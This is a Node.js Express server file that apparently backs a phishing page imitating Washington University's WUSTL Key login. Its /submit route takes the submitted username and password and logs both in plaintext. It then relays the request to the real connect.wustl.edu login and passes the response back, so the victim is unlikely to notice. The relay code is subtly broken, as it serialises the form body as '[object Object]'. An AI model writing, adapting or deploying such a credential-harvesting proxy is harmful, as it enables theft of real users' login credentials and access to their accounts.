const express = require('express');
const axios = require('axios');
const multer = require('multer');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = 3000;

app.use(cors());

const upload = multer();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.post('/submit', upload.none(), async (req, res) => {

    const { ucWUSTLKeyLogin$txtUsername, ucWUSTLKeyLogin$txtPassword } = req.body;

    console.log(`Received username: ${ucWUSTLKeyLogin$txtUsername}`);
    console.log(`Received password: ${ucWUSTLKeyLogin$txtPassword}`);

    try {
        // Send the POST request to the target website
        const response = await axios.post('https://connect.wustl.edu/login/wulogin.aspx?idp_ver=3&execution=e5s1&ref=https%3a%2f%2facadinfo.wustl.edu%2f', req.body.toString(), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': req.get('User-Agent'),
            },
        });
        console.log('Response from target website: ', response.data);
        // Forward the HTML response back to the client
        res.send(response.data);
    } catch (error) {
        console.error('Error during login attempt: ', error);
        res.status(500).send('Something went wrong.');
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
